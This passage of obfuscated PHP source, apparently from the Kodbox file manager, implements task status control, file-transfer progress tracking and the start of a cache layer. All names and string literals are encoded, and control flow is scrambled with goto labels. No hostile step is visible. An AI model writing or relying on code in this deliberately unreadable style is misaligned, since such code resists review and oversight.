$_SERVER[åÌÛ»ô¢‚ö™]; $D‡®½£µ» =& $this->task; if (!$D‡®½£µ») { return; } goto aÃÛŒƒ·‡; CÛ‘–ğ“Í: $D‡®½£µ»[$a‹Ã‹ŒÕ„[716]] = $CéÑÊ¯»ã„ ? $CéÑÊ¯»ã„ : $D‡®½£µ»[$a‹Ã‹ŒÕ„[716]]; $D‡®½£µ»[$a‹Ã‹ŒÕ„[1471]] = $d¹„·å¯ã[$a‹Ã‹ŒÕ„[1471]] ? $d¹„·å¯ã[$a‹Ã‹ŒÕ„[1471]] : 0; $D‡®½£µ»[$a‹Ã‹ŒÕ„[1470]] = timeFloat(); goto côğÃŞªŞó; c˜ÑÊİ¾ŠÚ: $this->updateAfter(); $Aˆ Ã«ßÆ = 0.2; if (timeFloat() - $D‡®½£µ»[$a‹Ã‹ŒÕ„[1470]] < $Aˆ Ã«ßÆ && !$F—±‹ÒÊ¢) { return; } goto BŸÂóÄİñ‚; BŸÂóÄİñ‚: $d¹„·å¯ã = self::get($D‡®½£µ»[$a‹Ã‹ŒÕ„[392]]); $CéÑÊ¯»ã„ = $d¹„·å¯ã[$a‹Ã‹ŒÕ„[716]]; if ($CéÑÊ¯»ã„ == self::STATYS_KILL) { $D¦Âéù‡º’ = array($a‹Ã‹ŒÕ„[1480] => LNG($a‹Ã‹ŒÕ„[1481]), $a‹Ã‹ŒÕ„[1059] => !1); Cache::set($a‹Ã‹ŒÕ„[1482] . $this->task[$a‹Ã‹ŒÕ„[392]], $D¦Âéù‡º’, 30); $this->end(); die; } else { if ($CéÑÊ¯»ã„ == self::STATYS_STOP) { $DĞ©£ä£‚ = 2; $d¹„·å¯ã[$a‹Ã‹ŒÕ„[1471]] += $DĞ©£ä£‚; self::valueSet($D‡®½£µ»[$a‹Ã‹ŒÕ„[392]], $d¹„·å¯ã); sleep($DĞ©£ä£‚); $this->update(); return; } } goto CÛ‘–ğ“Í; dÑÔ÷íæµë: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($d§³†÷èİ) { $fÀ¿–ÊÑ±õ =& $_SERVER[åÌÛ»ô¢‚ö™]; Cache::set($fÀ¿–ÊÑ±õ[1482] . $this->task[$fÀ¿–ÊÑ±õ[392]], $d§³†÷èİ, 60); return $d§³†÷èİ; } public static function get($DŠí À™ï’) { return self::valueGet($DŠí À™ï’); } public static function listData() { $e—ãÀ§÷»ã = self::valueGet(); return array_sort_by($e—ãÀ§÷»ã, $_SERVER[åÌÛ»ô¢‚ö™][1468], !0); } public static function kill($DÒö˜É™®Å) { return self::changeStatus($DÒö˜É™®Å, self::STATYS_KILL); } public static function stop($cÂ¿ìôÃ¦Ï) { return self::changeStatus($cÂ¿ìôÃ¦Ï, self::STATYS_STOP); } public static function restart($FŞ¥¾Ÿİâ) { return self::changeStatus($FŞ¥¾Ÿİâ, self::STATYS_RUNNING); } public static function killAll() { $AÑğ‚ŞØˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÅ”—î¦Ä… = self::listData(); foreach ($eÅ”—î¦Ä… as $d†æ½ÈÆÖÛ) { self::kill($d†æ½ÈÆÖÛ[$AÑğ‚ŞØˆ[392]]); } sleep(2); foreach ($eÅ”—î¦Ä… as $d†æ½ÈÆÖÛ) { self::valueSet($d†æ½ÈÆÖÛ[$AÑğ‚ŞØˆ[392]], !1); } } private static function changeStatus($C÷Î÷ˆùÌ©, $dÅÑæÊ¡ó) { goto d°¿Ğ¤æ¶; E¯ø†©øà: $F÷÷ÄÀŒßì[$cäƒ•—ô¿[716]] = $dÅÑæÊ¡ó; self::valueSet($C÷Î÷ˆùÌ©, $F÷÷ÄÀŒßì); self::log($cäƒ•—ô¿[1484] . $F÷÷ÄÀŒßì[$cäƒ•—ô¿[392]] . $cäƒ•—ô¿[1485] . $dÅÑæÊ¡ó); goto bÏøìö‡¼»; bÏøìö‡¼»: return !0; goto FÂÈ©®ŸŒæ; d°¿Ğ¤æ¶: $cäƒ•—ô¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F÷÷ÄÀŒßì = self::valueGet($C÷Î÷ˆùÌ©); if (!$F÷÷ÄÀŒßì) { return !1; } goto E¯ø†©øà; FÂÈ©®ŸŒæ: } public static function valueGet($fÚé Œ»¬î = false) { $D†‚Ñ£‹Ä¾ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($fÚé Œ»¬î) { $CĞÎßõ‘•î = Model($D†‚Ñ£‹Ä¾[424])->where(array($D†‚Ñ£‹Ä¾[89] => $fÚé Œ»¬î, $D†‚Ñ£‹Ä¾[29] => $D†‚Ñ£‹Ä¾[1486]))->find(); return $CĞÎßõ‘•î ? json_decode($CĞÎßõ‘•î[$D†‚Ñ£‹Ä¾[375]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($dñ‡ˆ‹ø = false) { goto DŠ¸Î¡Èá; F¶…æ…ˆØ«: $dÑ½¯Ó‚İ = Model($f•ÕŠ²Ê‘‘[424])->where($fÕÈ¦…´˜Õ)->select(); $dÑ½¯Ó‚İ = $dÑ½¯Ó‚İ ? $dÑ½¯Ó‚İ : array(); foreach ($dÑ½¯Ó‚İ as $fÈš¸œ‹·« => $e‹†ğ›—˜) { $dÑ½¯Ó‚İ[$fÈš¸œ‹·«] = json_decode($e‹†ğ›—˜[$f•ÕŠ²Ê‘‘[375]], !0); } goto bó¡Á÷¡¤Î; DŠ¸Î¡Èá: $f•ÕŠ²Ê‘‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÕÈ¦…´˜Õ = array($f•ÕŠ²Ê‘‘[29] => $f•ÕŠ²Ê‘‘[1486]); if ($dñ‡ˆ‹ø) { $fÕÈ¦…´˜Õ[$f•ÕŠ²Ê‘‘[1465]] = $dñ‡ˆ‹ø; } goto F¶…æ…ˆØ«; bó¡Á÷¡¤Î: return $dÑ½¯Ó‚İ; goto cÕìƒÒğ¿ˆ; cÕìƒÒğ¿ˆ: } public static function valueSet($BÆÛŒ¤Ë·, $CÔï™š›¢) { goto fÊ¼óÓ×è; fÊ¼óÓ×è: $fã×Û¿èÌ¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$CÔï™š›¢) { return Model($fã×Û¿èÌ¡[424])->where(array($fã×Û¿èÌ¡[89] => $BÆÛŒ¤Ë·, $fã×Û¿èÌ¡[29] => $fã×Û¿èÌ¡[1486]))->delete(); } $dª¤Â£²ƒ = json_encode($CÔï™š›¢); goto CƒØğòÁ–²; CƒØğòÁ–²: if (!$dª¤Â£²ƒ) { ob_start(); var_dump($CÔï™š›¢); $DÔÍöÖµ™’ = ob_get_clean(); self::log($fã×Û¿èÌ¡[1487] . json_encode_force($DÔÍöÖµ™’)); } if (!$BÆÛŒ¤Ë· || !$CÔï™š›¢[$fã×Û¿èÌ¡[392]]) { return !1; } $B†ï¡À™ª“ = array($fã×Û¿èÌ¡[29] => $fã×Û¿èÌ¡[1486], $fã×Û¿èÌ¡[1465] => USER_ID, $fã×Û¿èÌ¡[89] => $BÆÛŒ¤Ë·, $fã×Û¿èÌ¡[375] => $dª¤Â£²ƒ); goto Câ»„¬ÙÎ; Câ»„¬ÙÎ: Model($fã×Û¿èÌ¡[424])->add($B†ï¡À™ª“, array(), !0); goto D•ÉŠáì£; D•ÉŠáì£: } public static function log($DÉó†‰øõ) { write_log($DÉó†‰øõ, $_SERVER[åÌÛ»ô¢‚ö™][1488]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto CßŠÌöˆ˜Í; CßŠÌöˆ˜Í: $fíæ„›šáÉ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D„×Œ³ÖœÇ =& $this->task; $this->sourceCopyFolder = !1; goto cåˆÖË­£; F¾…×Œ¾÷Ş: $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1001]] = $fíæ„›šáÉ[33]; $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1512]] = $fíæ„›šáÉ[33]; $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1513]] = 0; goto aÏùÍÉÇ„‰; cåˆÖË­£: Hook::bind($fíæ„›šáÉ[1489], array($this, $fíæ„›šáÉ[1490])); Hook::bind($fíæ„›šáÉ[1491], array($this, $fíæ„›šáÉ[1492])); Hook::bind($fíæ„›šáÉ[1493], array($this, $fíæ„›šáÉ[1494])); goto A±öŠÏ¯ÖÛ; Bèó‘«½Õ½: Hook::bind($fíæ„›šáÉ[537], array($this, $fíæ„›šáÉ[1498])); Hook::bind($fíæ„›šáÉ[539], array($this, $fíæ„›šáÉ[1498])); Hook::bind($fíæ„›šáÉ[541], array($this, $fíæ„›šáÉ[1498])); goto cåÊŒëÑŒĞ; C¬Êã‚•ºµ: $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1508]] = LNG($fíæ„›šáÉ[1509]); $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1510]] = 0; $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1511]] = 0; goto F¾…×Œ¾÷Ş; e¹ÜõšÊĞ: Hook::bind($fíæ„›šáÉ[568], array($this, $fíæ„›šáÉ[1497])); Hook::bind($fíæ„›šáÉ[535], array($this, $fíæ„›šáÉ[1498])); Hook::bind($fíæ„›šáÉ[532], array($this, $fíæ„›šáÉ[1498])); goto Bèó‘«½Õ½; fßÄâöÜ´à: Hook::bind($fíæ„›šáÉ[1502], array($this, $fíæ„›šáÉ[1503])); Hook::bind($fíæ„›šáÉ[1504], array($this, $fíæ„›šáÉ[1505])); Hook::bind($fíæ„›šáÉ[1506], array($this, $fíæ„›šáÉ[1507])); goto C¬Êã‚•ºµ; aÏùÍÉÇ„‰: $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1514]] = 0; $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1515]] = 0; if (!$D„×Œ³ÖœÇ[$fíæ„›šáÉ[1368]]) { $D„×Œ³ÖœÇ[$fíæ„›šáÉ[1368]] = LNG($fíæ„›šáÉ[1516]); } goto d„Ñ‰¬åˆù; A±öŠÏ¯ÖÛ: Hook::bind($fíæ„›šáÉ[564], array($this, $fíæ„›šáÉ[1495])); Hook::bind($fíæ„›šáÉ[565], array($this, $fíæ„›šáÉ[1496])); Hook::bind($fíæ„›šáÉ[567], array($this, $fíæ„›šáÉ[1497])); goto e¹ÜõšÊĞ; cåÊŒëÑŒĞ: Hook::bind($fíæ„›šáÉ[1499], array($this, $fíæ„›šáÉ[1500])); Hook::bind($fíæ„›šáÉ[557], array($this, $fíæ„›šáÉ[1501])); $this->sourceModelCopyFlag = !1; goto fßÄâöÜ´à; d„Ñ‰¬åˆù: } protected function endAfter() { goto CŠŒ‘Æã”Ï; bˆÑÙù×é: Hook::unbind($Dİ•‰å…‡[1493], array($this, $Dİ•‰å…‡[1494])); Hook::unbind($Dİ•‰å…‡[564], array($this, $Dİ•‰å…‡[1495])); Hook::unbind($Dİ•‰å…‡[565], array($this, $Dİ•‰å…‡[1496])); goto eœ»‘™¯Ïƒ; eœ»‘™¯Ïƒ: Hook::unbind($Dİ•‰å…‡[567], array($this, $Dİ•‰å…‡[1497])); Hook::unbind($Dİ•‰å…‡[568], array($this, $Dİ•‰å…‡[1497])); Hook::unbind($Dİ•‰å…‡[535], array($this, $Dİ•‰å…‡[1498])); goto fÖ›³øØêˆ; EƒÙò³›“©: Hook::unbind($Dİ•‰å…‡[541], array($this, $Dİ•‰å…‡[1498])); Hook::unbind($Dİ•‰å…‡[1499], array($this, $Dİ•‰å…‡[1500])); Hook::unbind($Dİ•‰å…‡[557], array($this, $Dİ•‰å…‡[1501])); goto e‰ëÃÊ··’; CŠŒ‘Æã”Ï: $Dİ•‰å…‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; Hook::unbind($Dİ•‰å…‡[1489], array($this, $Dİ•‰å…‡[1490])); Hook::unbind($Dİ•‰å…‡[1491], array($this, $Dİ•‰å…‡[1492])); goto bˆÑÙù×é; e‰ëÃÊ··’: Hook::unbind($Dİ•‰å…‡[1502], array($this, $Dİ•‰å…‡[1503])); Hook::unbind($Dİ•‰å…‡[1504], array($this, $Dİ•‰å…‡[1505])); Hook::unbind($Dİ•‰å…‡[1506], array($this, $Dİ•‰å…‡[1507])); goto F‘ùµš‡ğ; fÖ›³øØêˆ: Hook::unbind($Dİ•‰å…‡[532], array($this, $Dİ•‰å…‡[1498])); Hook::unbind($Dİ•‰å…‡[537], array($this, $Dİ•‰å…‡[1498])); Hook::unbind($Dİ•‰å…‡[539], array($this, $Dİ•‰å…‡[1498])); goto EƒÙò³›“©; F‘ùµš‡ğ: } public function copyMoveStart($FôñÄæƒ«, $f˜êó¾ÏÚò, $E£“‹œÑ¿, $aø–²š³İˆ) { goto cˆÂí½™ß; cˆÂí½™ß: $B³İ¤›ÎÍ× =& $_SERVER[åÌÛ»ô¢‚ö™]; self::log($B³İ¤›ÎÍ×[1517] . $f˜êó¾ÏÚò . $B³İ¤›ÎÍ×[66] . $aø–²š³İˆ); $C¡„¨•è«õ = rtrim(TEMP_FILES, $B³İ¤›ÎÍ×[8]); goto fáèİ­Øƒ; DñÚƒ“¶ªÜ: $D´éÚß¿µ±[$B³İ¤›ÎÍ×[1518]] = KodIO::transferType($FôñÄæƒ«, $E£“‹œÑ¿); $this->update(); goto bôÊ½ÆÉö‘; fáèİ­Øƒ: if (substr($f˜êó¾ÏÚò, 0, strlen($C¡„¨•è«õ)) == $C¡„¨•è«õ) { return; } if (substr($aø–²š³İˆ, 0, strlen($C¡„¨•è«õ)) == $C¡„¨•è«õ) { return; } $D´éÚß¿µ± =& $this->task; goto DñÚƒ“¶ªÜ; bôÊ½ÆÉö‘: } public function updateAfter() { goto b‰šˆÛõÑË; bĞùÁ“ºÃ¸: if ($this->sourceModelCopyFlag) { return; } if ($Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1518]] == $a–ë˜ÂÑóˆ[1120]) { return; } if ($Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1518]] == $a–ë˜ÂÑóˆ[1067] || $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1518]] == $a–ë˜ÂÑóˆ[103]) { if ($Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1512]]) { $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1515]] = $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1514]] + $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1511]]; } } else { if ($Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1518]] == $a–ë˜ÂÑóˆ[1121]) { if ($Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1512]] == $a–ë˜ÂÑóˆ[1067]) { $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1515]] = $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1514]] + $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1511]] * 0.5; } else { if ($Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1512]] == $a–ë˜ÂÑóˆ[103]) { $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1515]] = $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1514]] + $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1510]] * 0.5 + $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1511]] * 0.5; } } } } goto B¸Ìì¢šÓ¨; b‰šˆÛõÑË: $a–ë˜ÂÑóˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fµ¼µŸóÕ =& $this->task; if (!$Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[725]]) { return; } goto bĞùÁ“ºÃ¸; B¸Ìì¢šÓ¨: $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1466]] = $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1515]] / $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[725]]; if ($Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1466]] > 0) { $EÏæ°…—‘á = timeFloat() - $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1468]] - $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1471]]; $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1472]] = $EÏæ°…—‘á * (1 - $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1466]]) / $Fµ¼µŸóÕ[$a–ë˜ÂÑóˆ[1466]]; } goto d”‹„ÁÒ÷Æ; d”‹„ÁÒ÷Æ: } public function addPath($fĞÉÒ¬·¼Â) { goto e¡Ò¡ˆâ¿; e¡Ò¡ˆâ¿: $C¡ó“±À’› =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$fĞÉÒ¬·¼Â) { return; } $DËµº¶¶…Ê =& $this->task; goto få‰™±×Œ; få‰™±×Œ: $aœŒˆˆ‡ï = IO::infoWithChildren($fĞÉÒ¬·¼Â); $Aâ»öÊ‰È = $DËµº¶¶…Ê[$C¡ó“±À’›[1519]] ? $DËµº¶¶…Ê[$C¡ó“±À’›[1519]][$C¡ó“±À’›[1520]] : 0; $DËµº¶¶…Ê[$C¡ó“±À’›[1519]] = array($C¡ó“±À’›[1520] => $Aâ»öÊ‰È + 1, $C¡ó“±À’›[411] => $aœŒˆˆ‡ï[$C¡ó“±À’›[28]], $C¡ó“±À’›[75] => $aœŒˆˆ‡ï[$C¡ó“±À’›[75]], $C¡ó“±À’›[492] => $aœŒˆˆ‡ï[$C¡ó“±À’›[492]] ? $aœŒˆˆ‡ï[$C¡ó“±À’›[492]] : $aœŒˆˆ‡ï[$C¡ó“±À’›[75]]); goto bî´«ä»š…; bî´«ä»š…: if ($aœŒˆˆ‡ï[$C¡ó“±À’›[29]] == $C¡ó“±À’›[171]) { $DËµº¶¶…Ê[$C¡ó“±À’›[999]] += 1; } else { $DËµº¶¶…Ê[$C¡ó“±À’›[999]] += $aœŒˆˆ‡ï[$C¡ó“±À’›[80]][$C¡ó“±À’›[78]]; if ($aœŒˆˆ‡ï[$C¡ó“±À’›[394]]) { $DËµº¶¶…Ê[$C¡ó“±À’›[999]] += $aœŒˆˆ‡ï[$C¡ó“±À’›[80]][$C¡ó“±À’›[79]] + 1; } } $DËµº¶¶…Ê[$C¡ó“±À’›[725]] += $aœŒˆˆ‡ï[$C¡ó“±À’›[77]]; $this->update(); goto a½ÒèÍãÉ; a½ÒèÍãÉ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($b‘·šÌËì) { $c¹¯¡ö¹¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c¢ŒÑÓ™ë† =& $this->task; $c¢ŒÑÓ™ë†[$c¹¯¡ö¹¹[1508]] = $b‘·šÌËì[$c¹¯¡ö¹¹[28]]; $c¢ŒÑÓ™ë†[$c¹¯¡ö¹¹[1001]] = $b‘·šÌËì[$c¹¯¡ö¹¹[28]]; $this->update(); } public function copyFileStart($FØ†‰Îê£ä, $D¥”Òğ¬Ÿ, $C‘ŒÚôœâ, $EŸ§—çµŒá, $B‡Å¡ÁùÂ¯, $Fëàè„•„) { goto Eåë‘ÀÜí§; Bæ¯»åÍ¯Ë: $GLOBALS[$eî¨áÌ™ì¨[1522]] = $B‡Å¡ÁùÂ¯; $GLOBALS[$eî¨áÌ™ì¨[1521]] = $Fëàè„•„; $bØêÜëË™ò =& $this->task; goto aî³‡çŠÚ; aî³‡çŠÚ: $bØêÜëË™ò[$eî¨áÌ™ì¨[1508]] = $eäé‚öŞŠÇ; $bØêÜëË™ò[$eî¨áÌ™ì¨[1510]] = (int) $FØ†‰Îê£ä->size($D¥”Òğ¬Ÿ); $bØêÜëË™ò[$eî¨áÌ™ì¨[1511]] = 0; goto EÛİİÏ; f§ÍóÑÑ: $this->update(); goto f¾î˜¸ÆÔ’; Eåë‘ÀÜí§: $eî¨áÌ™ì¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eäé‚öŞŠÇ = $B‡Å¡ÁùÂ¯; if ($eäé‚öŞŠÇ == $GLOBALS[$eî¨áÌ™ì¨[1521]]) { $eäé‚öŞŠÇ = $GLOBALS[$eî¨áÌ™ì¨[1522]]; } goto Bæ¯»åÍ¯Ë; EÛİİÏ: $bØêÜëË™ò[$eî¨áÌ™ì¨[1001]] = $eî¨áÌ™ì¨[33]; $bØêÜëË™ò[$eî¨áÌ™ì¨[1512]] = $eî¨áÌ™ì¨[33]; $bØêÜëË™ò[$eî¨áÌ™ì¨[1513]] = 0; goto f§ÍóÑÑ; f¾î˜¸ÆÔ’: } public function copyFileEnd($b½¥½ÕƒÏË, $BÍÑÎÌÔÂ, $f‘ˆàßß¶õ, $Aø§¯Ó„µ, $eêÖÖÁ–‹ä, $BŒÔİ‹¦°ä) { $A™ç¡ßÁĞÄ =& $_SERVER[åÌÛ»ô¢‚ö™]; $có–§ƒæ =& $this->task; $có–§ƒæ[$A™ç¡ßÁĞÄ[1511]] = $có–§ƒæ[$A™ç¡ßÁĞÄ[1510]]; $có–§ƒæ[$A™ç¡ßÁĞÄ[1512]] = $A™ç¡ßÁĞÄ[33]; if ($eêÖÖÁ–‹ä == $có–§ƒæ[$A™ç¡ßÁĞÄ[1508]]) { $có–§ƒæ[$A™ç¡ßÁĞÄ[1514]] += $có–§ƒæ[$A™ç¡ßÁĞÄ[1510]]; $có–§ƒæ[$A™ç¡ßÁĞÄ[1515]] = $có–§ƒæ[$A™ç¡ßÁĞÄ[1514]]; $this->update(1); } else { $this->update(); $có–§ƒæ[$A™ç¡ßÁĞÄ[1511]] = 0; } self::log($A™ç¡ßÁĞÄ[1523] . $BÍÑÎÌÔÂ . $A™ç¡ßÁĞÄ[66] . $Aø§¯Ó„µ . $A™ç¡ßÁĞÄ[183] . $eêÖÖÁ–‹ä . $A™ç¡ßÁĞÄ[1524] . $có–§ƒæ[$A™ç¡ßÁĞÄ[1508]]); } public function updateFileEnd($b›’ïâ•í¹, $DïÒÇ«å×É) { goto f³—‹Şñ’; aîõ‰ˆï°: $this->update(1); self::log($Dìá±ˆÌ‹É[1525] . $b›’ïâ•í¹); goto B¹Î¥ñ¯ëš; f³—‹Şñ’: $Dìá±ˆÌ‹É =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÚµãëª‘ =& $this->task; $eÚµãëª‘[$Dìá±ˆÌ‹É[1508]] = $b›’ïâ•í¹; goto cµ…ÄÔäê“; cµ…ÄÔäê“: $eÚµãëª‘[$Dìá±ˆÌ‹É[1510]] = $DïÒÇ«å×É; $eÚµãëª‘[$Dìá±ˆÌ‹É[1514]] += $DïÒÇ«å×É; $eÚµãëª‘[$Dìá±ˆÌ‹É[1515]] = $eÚµãëª‘[$Dìá±ˆÌ‹É[1514]]; goto aîõ‰ˆï°; B¹Î¥ñ¯ëš: } public function sourceModelCopy($c‚ŠŸøÁ×) { goto d×õâ’—Ù; aÇÚê„À¹ê: switch ($f°˜‘Ğ Æ–) { case $DßËáŠ½ [533]: $dœÏİ³Ùí = 1; break; case $DßËáŠ½ [536]: $eé“—Í±ŠØ[$DßËáŠ½ [1508]] = $BÊâà²‹[$DßËáŠ½ [28]]; break; case $DßËáŠ½ [538]: $dœÏİ³Ùí = intval($c‚ŠŸøÁ×[$DßËáŠ½ [379]] * 0.4); break; case $DßËáŠ½ [540]: $dœÏİ³Ùí = intval($c‚ŠŸøÁ×[$DßËáŠ½ [379]] * 0.2); break; case $DßËáŠ½ [542]: $dœÏİ³Ùí = intval($c‚ŠŸøÁ×[$DßËáŠ½ [379]] * 0.4); break; } $this->update($dœÏİ³Ùí); $this->sourceModelCopyFlag = !1; goto EÁ”ÓæƒœÙ; A×Ô®‡Ë‹Š: $eé“—Í±ŠØ =& $this->task; $this->sourceModelCopyFlag = !0; $dœÏİ³Ùí = 0; goto aÇÚê„À¹ê; d×õâ’—Ù: $DßËáŠ½  =& $_SERVER[åÌÛ»ô¢‚ö™]; $f°˜‘Ğ Æ– = $c‚ŠŸøÁ×[0]; $BÊâà²‹ = $c‚ŠŸøÁ×[1]; goto A×Ô®‡Ë‹Š; EÁ”ÓæƒœÙ: } public function sourceRemove($fä¢ôå°, $CÌº‹­–ë¥) { $a·ë¼õæÂ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->sourceModelCopyFlag = !0; $d©’»†—ä· = 1; if (isset($fä¢ôå°[$a·ë¼õæÂ[80]])) { $d©’»†—ä· = $fä¢ôå°[$a·ë¼õæÂ[80]][$a·ë¼õæÂ[78]] + $fä¢ôå°[$a·ë¼õæÂ[80]][$a·ë¼õæÂ[79]] + 1; } $this->update($d©’»†—ä·); $this->sourceModelCopyFlag = !1; } public function sourceMove($BÜÀ­ãÛÈĞ) { $this->sourceRemove($BÜÀ­ãÛÈĞ, !1); } public function curlProgress($D‹“çë´¡–, $dÖ‘­©õ¤‡, $d‡«Ö‘ƒÂ, $a°îÀƒ„ß, $a¯šóÜÈƒ) { $bÊ§„ÏÊêß =& $_SERVER[åÌÛ»ô¢‚ö™]; $d§›™ŠÍ­‡ =& $this->task; if ($a¯šóÜÈƒ > 0) { $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1001]] = $bÊ§„ÏÊêß[1526]; $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1512]] = $bÊ§„ÏÊêß[103]; if ($d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1510]] == $a°îÀƒ„ß || $a°îÀƒ„ß > 1024 * 1024) { $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1511]] = $a¯šóÜÈƒ; } if ($d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1513]]) { $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1511]] = $a¯šóÜÈƒ + $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1513]]; } } else { if ($d‡«Ö‘ƒÂ > 0) { if ($d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1510]] == $dÖ‘­©õ¤‡) { $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1511]] = $d‡«Ö‘ƒÂ; $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1001]] = $bÊ§„ÏÊêß[1527]; $d§›™ŠÍ­‡[$bÊ§„ÏÊêß[1512]] = $bÊ§„ÏÊêß[1067]; } } } $this->update(); } public function curlProgressStart($C’ã°ÓŸ÷) { } public function curlProgressEnd($Eä†½”ªè) { $cá¿¡êÍÉ¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f“ËëË£ÔÍ =& $this->task; $a®“–‘æ‡Õ = curl_getinfo($Eä†½”ªè); $f¤°Ê»†ó™ = $a®“–‘æ‡Õ[$cá¿¡êÍÉ¹[1528]]; if ($f“ËëË£ÔÍ[$cá¿¡êÍÉ¹[1512]] == $cá¿¡êÍÉ¹[103] && $f¤°Ê»†ó™) { $f“ËëË£ÔÍ[$cá¿¡êÍÉ¹[1513]] += $f¤°Ê»†ó™; } $this->update(); } } goto CíæšŒçĞÓ; dÈË¡„½Ö: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto b‰ğ°äÜİ; b‰ğ°äÜİ: $B¾‚Í«¼­Ê =& $_SERVER[åÌÛ»ô¢‚ö™]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto b´›š¾¤¦; A³ù¹¿ùÁ: switch ($AêÎ÷İÕ¢˜[$B¾‚Í«¼­Ê[780]]) { case $B¾‚Í«¼­Ê[17]: self::$handle = Model($B¾‚Í«¼­Ê[782]); break; case $B¾‚Í«¼­Ê[783]: self::$handle = new CacheRedis($CóõÌØğÕ, $E ÑŠˆƒ˜); break; case $B¾‚Í«¼­Ê[784]: self::$handle = new CacheMemcached($CóõÌØğÕ, $E ÑŠˆƒ˜); break; case $B¾‚Í«¼­Ê[171]: self::$handle = new CacheFile($CóõÌØğÕ, $E ÑŠˆƒ˜); break; default: break; } return self::$handle; goto a…”ñ; b´›š¾¤¦: $AêÎ÷İÕ¢˜ = $GLOBALS[$B¾‚Í«¼­Ê[6]][$B¾‚Í«¼­Ê[352]]; $CóõÌØğÕ = $AêÎ÷İÕ¢˜[$AêÎ÷İÕ¢˜[$B¾‚Í«¼­Ê[780]]]; $E ÑŠˆƒ˜ = $AêÎ÷İÕ¢˜[$B¾‚Í«¼­Ê[781]]; goto A³ù¹¿ùÁ; a…”ñ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($f¬Å°Úè¬µ) { if (is_array($f¬Å°Úè¬µ) || is_object($f¬Å°Úè¬µ)) { $f¬Å°Úè¬µ = json_encode($f¬Å°Úè¬µ); } $f¬Å°Úè¬µ = rawurlencode($f¬Å°Úè¬µ); return md5(KOD_SITE_ID . $_SERVER[åÌÛ»ô¢‚ö™][70] . $f¬Å°Úè¬µ); } public static function get($aˆ›ŒâÚÊ) { $FÊ–“´¾É = self::key($aˆ›ŒâÚÊ); if (!isset(self::$memoryCache[$FÊ–“´¾É])) { $dÜ–ß—²¼Š = self::init()->get($FÊ–“´¾É); self::$memoryCache[$FÊ–“´¾É] = unserialize($dÜ–ß—²¼Š); } return self::$memoryCache[$FÊ–“´¾É]; } public static function set($A‹ÂÇøÖâ±, $B¨À‹…ÙÎ, $eôÏùÌœ† = false) { goto d¿¢„¶˜±‘; d¿¢„¶˜±‘: $eÕÑ—âŠ = self::key($A‹ÂÇøÖâ±); if (isset(self::$memoryCache[$eÕÑ—âŠ]) && self::$memoryCache[$eÕÑ—âŠ] === $B¨À‹…ÙÎ) { return !0; } if ($eôÏùÌœ† === 0) { self::$memoryCache[$eÕÑ—âŠ] = $B¨À‹…ÙÎ; return !0; } goto F ©é†—‹î; F ©é†—‹î: 